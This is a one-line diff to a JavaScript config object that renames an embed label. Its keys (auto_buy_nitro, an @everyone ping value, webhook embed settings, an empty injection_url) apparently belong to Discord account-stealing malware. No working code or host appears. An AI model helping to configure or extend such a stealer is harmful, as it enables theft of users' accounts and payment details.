@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: true, 
   ping_on_run: false, 
   ping_val: '@everyone',
-  embed_name: 'OK',
+  embed_name: 'Nice',
   embed_icon: ''.replace(/ /g, '%20'),
   embed_color: 8363488,
   injection_url: '', 
